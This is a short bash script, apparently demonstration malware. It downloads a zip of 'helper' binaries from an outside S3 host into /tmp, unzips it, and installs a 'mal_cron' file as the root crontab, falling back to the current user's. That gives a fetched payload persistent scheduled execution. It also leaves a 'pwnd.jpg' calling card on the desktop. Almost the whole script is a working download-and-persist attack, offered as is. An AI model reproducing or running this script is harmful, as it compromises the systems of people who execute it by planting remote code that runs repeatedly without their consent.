#!/usr/bin/env bash
# Step 1: Check if we've already been here
if [[ -n $(find / -name pwnd.jpg) ]]; then
  exit 0
fi
# Step 2: Check identity
CURR_USR=$(whoami)
# Step 3: Download assisting binaries
ZIP_URL="https://genestealer-demo.s3.amazonaws.com/helpers.zip"
$(curl $ZIP_URL --output /tmp/helpers.zip --silent)
echo "File Successfully downloaded"
# Step 4: Move to dir, unzip
cd /tmp
echo "Current working directory: `pwd`"
$(unzip -oq ./helpers.zip)
# Step 5: Determine crontab directory
if [[ -d "/var/spool/cron/crontabs/" ]]; then
  CRON_DIR="/var/spool/cron/crontabs/"
elif [[ -d "/etc/cron.d/" ]]; then
  CRON_DIR="/etc/cron.d/"
else
  CRON_DIR="No cron"
fi
# Step 6: Add cron file
echo "Cron directory: $CRON_DIR"
if [[ $CRON_DIR != "No cron" ]]; then
  {
    # Attempt to create root cron file
    mv -f ./mal_cron $CRON_DIR"root"
  } || {
    # If failed, create as current user
    mv -f ./mal_cron $CRON_DIR$CURR_USR
  }
fi
# Step 7: Leave calling card :)
$(curl https://vignette.wikia.nocookie.net/warhammer40k/images/e/e7/Genestealer_Cultists_rise.jpg/ --output "home/$CURR_USR/Desktop/pwnd.jpg" --silent)
